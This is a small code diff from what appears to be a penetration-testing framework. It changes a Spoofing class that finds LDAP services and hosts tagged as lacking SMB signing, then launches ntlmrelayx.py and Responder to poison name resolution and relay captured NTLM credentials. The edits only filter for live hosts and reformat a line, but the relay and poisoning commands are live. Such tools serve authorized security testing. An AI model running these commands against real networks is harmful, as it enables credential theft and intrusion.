@@ -51,7 +51,7 @@ class Spoofing(object):
         """
         ldap_services = []
         if self.ldap:
-            ldap_services = self.search.get_services(ports=[389])
+            ldap_services = self.search.get_services(ports=[389], up=True)
 
         self.ldap_strings = ["ldap://{}".format(service.address) for service in ldap_services]
         self.services = self.search.get_services(tags=['smb_signing_disabled'])
@@ -78,7 +78,7 @@ class Spoofing(object):
             Starts the ntlmrelayx.py and responder processes.
             Assumes you have these programs in your path.
         """
-        self.relay = subprocess.Popen(['ntlmrelayx.py','-6', '-tf', self.targets_file, '-w', '-l', self.directory, '-of', self.output_file], cwd=self.directory)
+        self.relay = subprocess.Popen(['ntlmrelayx.py', '-6', '-tf', self.targets_file, '-w', '-l', self.directory, '-of', self.output_file], cwd=self.directory)
         self.responder = subprocess.Popen(['responder', '-I', self.interface_name])
 
 
